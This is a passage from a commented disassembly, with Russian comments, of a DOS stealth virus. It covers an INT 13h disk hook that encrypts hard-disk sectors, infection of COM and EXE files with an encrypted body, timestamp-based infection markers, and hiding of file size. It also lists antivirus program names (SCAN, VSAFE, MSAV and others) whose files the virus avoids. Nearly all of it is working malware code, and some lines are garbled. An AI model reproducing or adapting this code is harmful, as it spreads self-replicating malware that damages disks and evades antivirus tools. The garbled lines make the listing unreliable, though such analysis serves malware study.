 080B  E3 4C	jcxz	loc_79		; с сектора ноль ?!! Тоже ERROR !

 080D  80 F9 01		cmp	cl,1
 0810  74 39		je	loc_77	; если сектор 01

 0812		loc_72:			;  /xref0837/
 0812  80 F9 11		cmp	cl,11h
				   ^^	; xref03FA - макс. секторов на дорожке
 0815  77 42		ja	loc_79	; попытка писать в тело - ошибка
 0817  80 F9 0A		cmp	cl,0Ah
				   ^^	; начало вирусных секторов
 081A  72 34		jb	loc_78
 081C  80 FC 03		cmp	ah,3	; запись
 081F  74 38		je	loc_79	; попытка писать в тело - ошибка

			== чтение

 0821  53		push	bx
 0822  B9 0200		mov	cx,200h
 0825		locloop_73:		; /xref 082A/ забиваем нулями чтение
					; тела вируса
 0825  26: C6 07 00	mov	byte ptr es:[bx],0
 0829  43		inc	bx
 082A  E2 F9		loop	locloop_73
 082C  5B		pop	bx

 082D		loc_74:			;  /xref 0857/
 082D  81 C3 0200	add	bx,200h	; следующий сектор
 0831  58		pop	ax
 0832  59		pop	cx
 0833  41		inc	cx
 0834  51		push	cx
 0835  50		push	ax
 0836  4E		dec	si
 0837  75 D9		jnz	loc_72
 0839		loc_75:			;  /xref 0809/
 0839  F8		clc
 083A		loc_76:			;  /xref 0855, 085C/
 083A ·58		pop	ax
 083B  9C		pushf
 083C  97		xchg	di,ax
 083D  2B C6		sub	ax,si
 083F  9D		popf
 0840  8A E5		mov	ah,ch
 0842  59		pop	cx
 0843  59		pop	cx
 0844  5F		pop	di
 0845  5E		pop	si
 0846  5A		pop	dx
 0847  5B		pop	bx
 0848  CA 0002		retf	2	; Выход из INT 13

		== Работают с MBR
 084B		loc_77:				;  /xref 0810/
 084B  2E: 8A 0E 0E7F	mov	cl,cs:0E7Fh	;  местонахождение ориг. MBR
 0850		loc_78:				;  /xref 081A/
 0850  E8 FF53		call	sub_14		; (07A6) Original INT_13
 0853  8A EC		mov	ch,ah
 0855  72 E3		jc	loc_76		; ошибка
 0857  EB D4		jmp	short loc_74	; (082D)

 0859		loc_79:				;  /xref 080B, 0815, 081F/
 0859  F9		stc
 085A  B5 BB		mov	ch,0BBh		; код ошибки
 085C  EB DC		jmp	short loc_76	; (083A)
 085E		loc_80:				;  /xref 07F0, 07F6/
 085E  80 FA 80		cmp	dl,80h		; только винт
 0861  75 6B		jne	Int13Exit

 0863  50		push	ax
 0864  51		push	cx
 0865  52		push	dx
 0866  56		push	si
 0867  1E		push	ds
 0868  0E		push	cs
 0869  1F		pop	ds
 086A  C6 06 0E2D 00	mov	byte ptr ds:0E2Dh,0	; число секторов диска
 086F  89 1E 0E2F	mov	ds:0E2Fh,bx		; адрес буффера
 0873  E8 FF37		call	GetTrackNo		; (07AD)
 0876  80 E1 3F		and	cl,3Fh
 0879  80 E6 3F		and	dh,3Fh
 087C		loc_81:				; /xref 089F,
						;       08A8, 08AD/
 087C  0A C0		or	al,al
 087E  74 2F		jz	loc_84
 0880  81 FE 0332	cmp	si,0332h
				   ^^^^		; нижний зашифрованный
 0884  73 29		jae	loc_84		; сектор
 0886  81 FE 1234	cmp	si,1234h
 0888        ____                  ^^^^		; /xref 0154/ верхняя граница
 088A  72 06		jb	loc_82		; зашифрованного
 088C  FE 06 0E2D	inc	byte ptr ds:0E2D ; число секторов диска	для
						; шифрования
 0890  EB 06		jmp	short loc_83	; (0898)
 0892		loc_82:				;  /xref 088A/
 0892  81 06 0E2F 0200	add	word ptr ds:0E2F,0200h
 0898		loc_83:				;  /xref 0890/
 0898  FE C8		dec	al
 0F00 089A  FE C1	inc	cl
 ???? 089C  80 F9 11	cmp	cl,11h		; макс. секторов
				   ^^
 089F  76 DB		jbe	loc_81		; продолжим

 08A1  B1 01		mov	cl,1
 08A3  FE C6		inc	dh
 08A5  80 FE 05		cmp	dh,05		; макс.головок
				   ^^
 08A8  76 D2		jbe	loc_81
 08AA  32 F6		xor	dh,dh
 08AC  46		inc	si		; следующий сектор
 08AD  EB CD		jmp	short loc_81
 08AF		loc_84:				; /xref 087E, 0884/
 08AF  80 3E 0E2D 00	cmp	byte ptr ds:0E2D,0	; все сектора готовы ?
 08B4  1F		pop	ds
 08B5  5E		pop	si
 08B6  5A		pop	dx
 08B7  59		pop	cx
 08B8  58		pop	ax
 08B9  74 13		jz	Int13Exit

 08BB  80 FC 02		cmp	ah,2
 08BE  74 03		je	loc_85
						; запись - шифруем
 08C0  E8 FF00		call	SecCrypt	; Шифруем
 08C3		loc_85:				; /xref 08BE/
 08C3  E8 FEE0		call	sub_14		; (07A6) INT 13
 08C6  9C		pushf
 08C7  E8 FEF9		call	SecCrypt	; Шифруем
 08CA  9D		popf
 08CB  CA 0002		retf	2
 08CE		Int13Exit:			;  /xref 07E9, 0861, 08B9/
 08CE  EA		db	0EAh

 Called from:   /xref 0750, 0946/		; запись в файл и проверка
;▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄

 08CF  B4 40		MOV AH,40h 
       EB 02		JMP SHORT L_08D5

		FRead	proc	near
 08D3  B4 3F		mov	ah,3Fh			
 08D5  E8 0015	l_08D5:	call	Int21Call_BX	; (08ED)
 08D8  72 02		jc	loc_ret_87		 
 08DA  3B C1		cmp	ax,cx
 08DC		loc_ret_87:			; /xref 08D8/
 08DC  C3		retn
		FRead	endp


;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
;         /xref 093C, 0A95/
		FSeek0	proc	near
 08DD  33 C9		xor	cx,cx			
 08DF  8B D1		mov	dx,cx

;▀▀▀▀ Eternal Entry into Subroutine ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀

;         Called from 0743, 0757

		FSeekBoF:
 08E1  B8 4200		mov	ax,4200h
 08E4  EB 07		jmp	Int21Call_BX		; (08ED)

;▀▀▀▀ External Entry into Subroutine ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
;
;         Called from:   525D:0952, 0A76, 0A7E

		sub_21:
 08E6  33 C9		xor	cx,cx			
 08E8  8B D1		mov	dx,cx

;▀▀▀▀ External Entry into Subroutine ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
;
;         Called from:   525D:09E7
			sub_22:

 08EA  B8 4202				mov	ax,4202h

;         Called from:   525D:08D5, 08FF, 0AAC, 0C43

▄▄▄ INT 21 CALLS ▄▄▄
			Int21Call_BX:
08ED  2E: 8B 1E 0F39		mov	bx,cs:[0F39h]	; хендл
			Int21Call:
08F2  9C			pushf				
08F3  FA			cli				
08F4  2E: FF 1E 0DE8		call	dword ptr cs:[0DE8h]  ; DOS Int
08F9  C3			retn
			FSeek0	endp

;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
;                              SUBROUTINE
;         Called from:   525D:0C3E

		sub_25	proc	near
08FA  8B EC		mov	bp,sp
08FC  B8 5700		mov	ax,5700h
08FF  E8 FFEB		call	Int21Call_BX	; (08ED) получить время файла
0902  BB 0F63		mov	bx,[0F63h]	
0905  89 0F		mov	[bx],cx         ; сохраним время 
0907  89 57 02		mov	[bx+2],dx       
090A  E8 02C8		call	TimeTest	; (0BD5) проверка на заражен-
						; ность (по времени файла)
090D  72 79		jc	loc_91		; возврат 
090F  BA 001E		mov	dx,1Eh		
0912  E8 FC48		call	GetRND		; (055D) Случайное число 0..29
0915  0B D2		or	dx,dx		
0917  74 02		jz	loc_89
0919  89 07		mov	[bx],ax		; случайное число секунд (0..58)
091B		loc_89:				; /xref 0917/
091B  C7 06 074A 0040	mov	word ptr ds:[74Ah],40h
						; адрес оригинальных байт
0921  BA FFFF		mov	dx,0FFFFh
0924  52		push	dx
0925  E8 FC35		call	GetRND		; (055D) Any RND DX
0928  89 16 05B7	mov	MovAXoper,dx		
092C  89 16 0DFA	mov	ds:0DFA,dx	 ;(0DFA) Ключ шифровки
0930  5A		pop	dx
0931  E8 FC29		call	GetRND			
0934  89 16 05BF	mov	DS:AddAxOper,dx	; для таблицы комманд (05BF)
0938  89 16 0E02	mov	ds:0E02H,dx	; ключ шифровки

 093C  E8 FF9E		call	FSeek0		; (08DD)
 093F  B9 001A		mov	cx,1Ah			
 0942  BA 0F45		mov	dx,0F45h	; Адресс буффера для чтения
 0945  52		push	dx
 0946  E8 FF8A		call	FRead		; (08D3) Считать 26 байт
						; с начала	
 0949  72 57		jc	loc_93			
 094B  87 F2		xchg	si,dx		
 094D  BF 0010		mov	di,[0010h]	; адрес оригинального заголовка
						;(начала) файла
 0950  F3/ A4		rep	movsb		; сохраним начало файла	
 0952  E8 FF91		call	sub_21		; (08E6) указатель на конец файла
 0955  8B F0		mov	si,ax		
 0957  8B FA		mov	di,dx		
 0959  5B		pop	bx		
 095A  81 3F 4D5A	cmp	word ptr [bx],4D5Ah
 095E  74 18		je	loc_90
 0960  81 3F 5A4D	cmp	word ptr [bx],5A4Dh
 0964  74 12		je	loc_90
			;============================= обработка COM
 0966  C6 06 0022 00	mov	byte ptr ds:[22h],00    ; признак: COM файл
 096B  3D EFA6		cmp	ax,0EFA6h		; макс.допустимая длина
 096E  F5		cmc				
 096F  72 31		jc	loc_93			; не заражать - длиннее
							; допустимого 
 0971  B8 0003		mov	ax,3			
 0974  99		cwd				
 0975  53		push	bx
 0976  EB 1C		jmp	short loc_92		; (0994)
			; ============== Обработка EXE
 0978		loc_90:					;  /xref 095E, 0964/
 0978  C6 06 0022 01	mov	byte ptr ds:[22h],1	; признак: EXE=1
 097D  8B 47 04		mov	ax,[bx+4]		; 512 байтовых страниц
 0980  F7 26 00A8	mul	Multi200		
 0984  2B C6		sub	ax,si		    ; проверка на оверлейность
 0986  1B D7		sbb	dx,di			
 0988		loc_91:					; /xref 090D/
 0988  72 18		jc	loc_93			; реальная длина больше
							; скрытый оверлей
 098A  8B 47 08		mov	ax,[bx+8]		; длина заголовка в
							; 16байтовых параграфах
 098D  F7 26 00A4	mul	Multi10	
 0991  53		push	bx
 0992  50		push	ax
 0993  52		push	dx
			; =============== COM & EXE
 0994		loc_92:					; xref 0976
 0994  2B F0		sub	si,ax			; размер исполняемого
							; кода
							; (-3 для COM)
 0996  1B FA		sbb	di,dx			
 0998  0B FF		or	di,di				
 099A  75 0E		jnz	loc_94			
			; =============== EXE больше 64K
 099C  8B D6		mov	dx,si			
 099E  81 EA 03E8	sub	dx,1000
 09A2		loc_93:				; /xref 0949,096F,0988/
 09A2  72 72		jc	loc_99		; <1000 байт не трогаем
 09A4  81 FA 07D0	cmp	dx,2000			 
 09A8  76 03		jbe	loc_95			
 09AA		loc_94:				;  xref 099A
 09AA  BA 07D0		mov	dx,2000
 09AD		loc_95:				;  xref 09A8
 09AD  E8 FBAD		call	GetRND		; (055D) RND в диапазоне длины
						; файла, но не более 2000
 09B0  81 C2 03E8	add	dx,1000
 09B4  89 16 05B3	mov	d_05B3,dx	; адрес начала вируса в таблице

 09B8  81 C2 1058	add	dx,1058h	; DX для установки стека в EXE
 09BC  80 3E 0022 00	cmp	byte ptr ds:[22h],0	
 09C1  74 04		je	loc_96		
						;==== EXE файл
 09C3  89 16 0F55	mov	ds:[0F55h],dx		; Установка SP для EXE
 09C7		loc_96:					; xref 09C1
 09C7  81 C2 FD80	add	dx,-640			; указывает на конец 
							; тела вируса
 09CB  89 16 05C6	mov	d_05C6,dx		; верхняя граница для
							; расшифровщика
 09CF  81 C2 F577	add	dx,0F577h
 09D3  89 16 003E	mov	word ptr ds:[3Eh],dx	; точка входа в основ-
							; ное тело вируса
 09D7  81 C2 FCA8	add	dx,0FCA8h		; DX=верхняя граница 
							; для установки пятен =
							; = длина-9
 09DB  89 16 06BF	mov	word ptr ds:[6BFh],dx   
 09DF  83 C2 08		add	dx,8			; длина-1
 09E2  F7 D2		not	dx			; dx=-dx  Указатель 
					; будет позиционирован от конца файла
 09E4  B9 FFFF		mov	cx,0FFFFh			
 09E7  E8 FF00		call	sub_22			; (08EA) Установить
							; указатель
 09EA  89 16 0736	mov	word ptr ds:[736h],dx	; Адрес первого пятна 
 09EE  A3 0739		mov	word ptr ds:[739h],ax

 09F1  80 3E 0022 00	cmp	byte ptr ds:[22h],0	
 09F6  75 07		jne	loc_97			
							;==== COM
 09F8  92		xchg	dx,ax
 09F9  81 C2 0100	add	dx,100h			; + PSP offset
 09FD  EB 0A		jmp	short loc_98		; (0A09)
							;==== EXE
 09FF		loc_97:					; /xref09F6/
					; Вычисление IP файла
					; IP будет указывать на первое пятно
 09FF  5F		pop	di
 0A00  5E		pop	si
 0A01  2B C6		sub	ax,si			
 0A03  1B D7		sbb	dx,di
 0A05  F7 36 00A	div	Multi10			
 0A09		loc_98:				;  /xref09FD/
 0A09  01 16 05B3	add	d_05B3,dx	; Добавить к адресам начала и
				    ; конца основного тела :  IP EXEшника или
				    ; 100h для COM'а.	
 0A0D  01 16 05C6	add	d_05C6,dx	
 0A11  50		push	ax
 0A12  52		push	dx
 0A13  E8 FC43		call	MakeSpot   ; (0659) Создаем и пишем пятна
 0A16		loc_99:			   ; /xref 09A2/
 0A16  72 64		jc	loc_104			
 0A18  5A		pop	dx
 0A19  58		pop	ax
					; Дополняем таблицу пятен значением IP
 0A1A  B9 000A		mov	cx,0Ah
 0A1D ·BE 002A		mov	si,002Ah  
 0A20		locloop_100:	
 0A20  01 14		add	[si],dx	
 0A22  46		inc	si
 0A23  46		inc	si
 0A24  E2 FA		loop	locloop_100		

 0A26  5B		pop	bx
 0A27  80 3E 0022 00	cmp	byte ptr ds:0022h,00
 0A2C  75 20		jne	loc_101	
							;==== COM
 0A2E  C6 07 E9		mov	byte ptr [bx],0E9h	; JMP NEAR
 0A31  A1 002A		mov	ax,ds:002Ah		; Адрес первого пятна
 0A34  2D 0103		sub	ax,103h			
 0A37  89 47 01		mov	[bx+1],ax		; Ставим JMP'er на 
							; первое пятно
 0A3A  C7 06 0016 0000	mov	word ptr ds:0016h,0	; ReloCnt=0
 0A40  C7 06 0026 FFF0	mov	word ptr ds:0026h,0FFF0h	; ReloCS
 0A46  C7 06 0024 0100	mov	word ptr ds:0024h,0100h	; ExeIP
 0A4C  EB 27		jmp	short loc_103		; (0A75)
							;==== EXE
 0A4E		loc_101:				;  /xref 0A2C/
 0A4E  89 47 16		mov	[bx+16h],ax		; ReloCS
 0A51  89 47 0E		mov	[bx+0Eh],ax		; ReloSS
 0A54  A1 002A		mov	ax,ds:002Ah		; адрес первого пятна
 0A57  89 47 14		mov	[bx+14h],ax		; ExeIP
 0A5A  01 57 10		add	[bx+10h],dx		; ExeSP
 0A5D  C7 47 06 0000	mov	word ptr [bx+6],0	; ReloCnt=0
							; MinMem <= 28h
 0A62  B8 0028		mov	ax,28h
 0A65  39 47 0A		cmp	[bx+0Ah],ax
 0A68  73 03		jae	loc_102			 
 0A6A  89 47 0A		mov	[bx+0Ah],ax		
 0A6D		loc_102:				;  /xref 0A68/
							; MaxMem >= 28h
 0A6D  39 47 0C		cmp	[bx+0Ch],ax		
 0A70  73 03		jae	loc_103		
 0A72  89 47 0C		mov	[bx+0Ch],ax
 0A75		loc_103:				; /xref 0A4C,0A70/
 0A75  53		push	bx
 0A76  E8 FE6D		call	sub_21	; (08E6) Указатель на конец файла
 0A79  E8 035C		call	sub_33	;*(0DD8) Шифруем и пишем основное
					; тело вируса в файл	
 0A7C		loc_104:		;  /xref 0A16/
 0A7C  72 31		jc	loc_106			
 0A7E  E8 FE65		call	sub_21	; (08E6) Указатель на конец файла
 0A81  F7 36 00A8	div	word ptr ds:Multi200	
 0A85  40		inc	ax
 0A86  5B		pop	bx
 0A87  80 3E 0022 00	cmp	byte ptr ds:0022h,0
 0A8C  74 06		je	loc_105
				; ======= EXE === Hовый PageCnt и PartPag
 0A8E  89 47 04		mov	[bx+4],ax
 0A91  89 57 02		mov	[bx+2],dx
 0A94		loc_105:					;  xref 0A8C
 0A94  53		push	bx
				;====== Перезаписать начало файла
 0A95  E8 FE45		call	FSeek0				; (08DD)
 0A98  B9 001A		mov	cx,1Ah
 0A9B  5A		pop	dx
 0A9C  E8 FE30		call	sub_17			;(08CF)
 0A9F  72 0E		jc	loc_106		

 0AA1  B8 5701		mov	ax,5701h	; установить прежнее время
 0AA4  8B 0E 0F63	mov	cx,ds:[0F63h]
 0AA8  8B 16 0F65	mov	dx,ds:[0F65h]
 0AAC  E8 FE3E		call	Int21Call_BX		; (08ED)
 0AAF		loc_106:				;  xref 0A7C, 0A9F
 0AAF  8B E5		mov	sp,bp
 0AB1  C3		retn
		sub_25		endp


;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
;         SUBROUTINE  Перехват INT24
;
;         Called from 0C15
;▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄

	      TakeINT24	proc	near
0AB2  52		push	dx
0AB3  1E		push	ds
0AB4  0E		push	cs
0AB5  1F		pop	ds
0AB6  B8 3524		mov	ax,3524h
0AB9  E8 FE36		call	Int21Call			; (08F2)
0ABC  8C 06 0F61	mov	word ptr ds:0F5Fh+2,es	
0AC0  89 1E 0F5F	mov	ds:0F5Fh,bx		
0AC4  B8 2524		mov	ax,2524h
0AC7  BA 0E09		mov	dx,0E09h
0ACA  E8 FE25		call	Int21Call			; (08F2)
0ACD  1F		pop	ds
0ACE  5A		pop	dx
 0ACF  C3					retn
				TakeINT24		endp


;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
;   SUBROUTINE Восстановить оригинальный вектор INT 24
;          xref 0C51
;▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄

				Int24Back		proc	near
 0AD0  B8 2524				mov	ax,2524h
 0AD3  2E: C5 16 0F5F			lds	dx,dword ptr cs:0F5Fh
 0AD8  E8 FE17				call	Int21Call	; (08F2)
 0ADB  C3					retn
				Int24Back		endp

							; xref 0B5C
0ADC  		ExtList	db  4, '.COM'
0AE1				db  4, '.EXE'
							; xref 0B88
0AE6  		data_103	db  4,'SCAN'
0AEB				db  5,'CLEAN'
				db  8,'FINDVIRU'
0AFA  				db  5,'GUARD'
0B00  				db  3,'NOD',5,'VSAFE'
0B06  				db  4,'SAFE'
				db  4,'MSAV'
0B0F  		data_104	db  6,'CHKDSK'		;  xref 0B78

;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
;      SUBROUTINE   Проверка пригодности файла к заражению
;		    CF если нет
;         Called from:   525D:0D7B, 0D8D
;▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄

	     TestFile	proc	near
0B16  52		push	dx bx cx si di ds es ax
0B1E  8B F2		mov	si,dx
0B20 ·BF 0FB4		mov	di,0FB4
0B23  0E		push	cs
0B24  07		pop	es
0B25  8D 5D FF	 	lea	bx,[di-1]    
0B28  B9 004B		mov	cx,4Bh
0B2B		locloop_107:				;
0B2B  AC		lodsb				;
0B2C  3C 61		cmp	al,'a'			; Буквы в UpperCase
0B2E  72 06		jb	loc_108			;
0B30  3C 7A		cmp	al,'z'			;
0B32  77 02		ja	loc_108			;
0B34  2C 20		sub	al,20h			;
0B36		loc_108:				

0B36  50		push	ax
0B37  56		push	si
0B38    	  loc_109:				;
0B38  3C 20		cmp	al,20h			; игнорировать пробелы
0B3A  75 09		jne	loc_110			;
0B3C  AC		lodsb				;
0B3D  0A C0		or	al,al			;
0B3F  75 F7		jnz	loc_109			;
0B41  5E		pop	si                      ; конец строки (0) ?
0B42  5E		pop	si                      ;
0B43  EB 10		jmp	short loc_112		; (0B55)

0B45		 loc_110:				;
0B45  5E		pop	si
0B46  58		pop	ax
0B47  3C 5C		cmp	al,'\'
0B49  74 08		je	loc_111
0B4B  3C 2F		cmp	al,'/'
0B4D  74 04		je	loc_111
0B4F  3C 3A		cmp	al,':'
0B51  75 02		jne	loc_112
0B53		 loc_111:			;
0B53  8B DF		mov	bx,di		; \ / : -сохранить позицию в BX
0B55		 loc_112:			;
0B55  AA		stosb			;
0B56  0A C0		or	al,al		;
0B58  74 02		jz	loc_113		; выход если конец строки
0B5A  E2 CF		loop	locloop_107	;
;	Hахождение начала имени файла

0B5C		  loc_113:			;  /xref 0B58/
0B5C ·BE 0ADC		mov	si,offset ExtList	
0B5F  83 EF 05		sub	di,5		; минус 4 буквы от конца имени
0B62  0E		push	cs	
0B63  1F		pop	ds
0B64  E8 0060		call	StrCmp		 ; (0BC7) COM ?
0B67  74 05		jz	loc_114		 
0B69  E8 005B		call	StrCmp		 ; (0BC7) EXE ?
0B6C  75 4C		jnz	loc_118		 

0B6E		loc_114:			 ; .COM
0B6E  58		pop	ax
0B6F  50		push	ax
0B70  87 FB		xchg	di,bx
0B72  47		inc	di
0B73  3D 4B00		cmp	ax,4B00h
0B76  75 0D		jne	loc_115			
0B78 ·BE 0B0F		mov	si,offset data_104	; Запуск CHKDSK ?
0B7B  E8 0049		call	StrCmp			; (0BC7)
0B7E  75 05		jnz	loc_115			
0B80  C6 06 0C6A 2D	mov	byte ptr ds:[0C6Ah],2Dh	; закрыть ветку 
							; маскировки длины
0B85		loc_115:				; /xref 0B76, 0B7E/
0B85  B9 0007		mov	cx,7			; проверка на антивирусы
0B88 ·BE 0AE6		mov	si,offset data_103	;
0B8B		locloop_116:				;
0B8B  51		push	cx
0B8C  E8 0038		call	StrCmp			; (0BC7)
0B8F  59		pop	cx
0B90  74 28		jz	loc_118			; Jump if zero
0B92  E2 F7		loop	locloop_116		; Loop if cx > 0
							; путь свободен !
0B94 ·BE 0FB4		mov	si,0FB4h		; имя файла
0B97  32 DB		xor	bl,bl			; Zero register
0B99  AD		lodsw				; String [si] to ax
0B9A  80 FC 3A		cmp	ah,':'		; присутствует имя диска?
0B9D  75 04		jne	loc_117		; Default=0
0B9F  2C 40		sub	al,40h		; Буква в цифру : A=1,...
0BA1  8A D8		mov	bl,al
0BA3		loc_117:			; xref 0B9D
0BA3  B8 4408		mov	ax,4408h	; проверка типа диска
0BA6  E8 FD49		call	Int21Call			; (08F2)
0BA9  0B C0		or	ax,ax		; дискета ?
0BAB  74 17		jz	loc_120		; 
      ^^				; JMP SHORT /xref 031B/-при старте с
					; файлов не проверяет сетевой ли диск
				
0BAD  B8 4409		mov	ax,4409h
0BB0  E8 FD3F		call	Int21Call	; сетевой диск ?
0BB3  72 05		jc	loc_118		;
0BB5  F6 C6 10		test	dh,10h          ; Атрибут сетевого диска.
0BB8  75 0A		jnz	loc_120
0BBA		loc_118:			; /xref 0B6C, 0B90, 0BB3/
0BBA  F9		stc			
0BBB		loc_119:			; /xref0BC5/ Выход из процедуры
0BBB ·58		pop	ax
0BBC  07		pop	es
0BBD  1F		pop	ds
0BBE  5F		pop	di
0BBF  5E		pop	si
0BC0  59		pop	cx
0BC1  5B		pop	bx
0BC2  5A		pop	dx
0BC3  C3		retn

0BC4		loc_120:		;  xref 0BAB, 0BB8
0BC4  F8		clc		;  файл пригоден для заражения
0BC5  EB F4	jmp	short loc_119	; (0BBB)
		TestFile		endp


;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
;         SUBROUTINE
; Сканирование строк
;         Called from:   0B64, 0B69, 0B7B, 0B8C
     si=список, di=сканируемая строка
;▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄

		StrCmp	proc	near
0BC7  57		push	di
0BC8  AC		lodsb				
0BC9  8A C8		mov	cl,al   ; размер текущего элемента
0BCB  8B C6		mov	ax,si
0BCD  03 C1		add	ax,cx   ; следующий элемент
0BCF  F3/ A6		repe	cmpsb	
0BD1  8B F0		mov	si,ax
0BD3  5F		pop	di
0BD4  C3		retn
		StrCmp	endp


;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
	  SUBROUTINE Проверка Признака Заражения . ES:BX=FCB:(дата и время)
;
;         Called from:   525D:090A, 0C88, 0CB4
;
;	  Признаком заражения файла являются не **-дцать секунд,	
;	  а равенство секунд остатку от деления даты на 30
;▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄

		    TimeTest	proc	near
0BD5  52			push	dx
0BD6  26: 8B 47 02		mov	ax,es:[bx+2]    ; дата
0BDA  33 D2			xor	dx,dx			
0BDC  2E: F7 36 00A6		div	cs:Divi30	 
0BE1  26: 8B 07			mov	ax,es:[bx]
0BE4  24 1F			and	al,1Fh
0BE6  3A C2			cmp	al,dl 		; секунды 
0BE8  F9			stc			; файл заражен
0BE9  74 09			jz	loc_121		;
0BEB  26: 8B 07			mov	ax,es:[bx]      ;
0BEE  25 FFE0			and	ax,0FFE0h       ;
0BF1  0A C2			or	al,dl           ; установить секунды
0BF3  F8			clc			; файл не заражен
0BF4			loc_121:			;
0BF4  5A			pop	dx
0BF5  C3			retn
				TimeTest		endp


;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
;         SUBROUTINE  Скрыть истинный размер зараженного файла
;                     ES:BX = FCB:размер
;         Called from:   525D:0C91, 0CBD
;▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄

		  HideSize	proc	near

0BF6  26: 81 2F 0DD8	sub	word ptr es:[bx],0DD8h  ; размер вируса 
0BFB  26: 83 5F 02 00	sbb	word ptr es:[bx+2],0
0C00  73 0A		jnc	HideSizeExit		
0C02  26: 81 07 0DD8	add	word ptr es:[bx],0DD8h  ; Обратно если <0DD8h
0C07  26: 83 57 02 00	adc	word ptr es:[bx+2],0
0C0C		  HideSizeExit:	
0C0C  C3		retn

  		  HideSize	endp


;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
;         SUBROUTINE	Вызывает процедуру инфицирования файла с пред- и 
;			пост- обработкой.
;
;         Called from:   0D64, 0D80
;▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄

	MainInfect	proc	near

 0C0D  50		push	ax
 0C0E  53		push	bx
 0C0F  51		push	cx
 0C10  56		push	si
 0C11  57		push	di
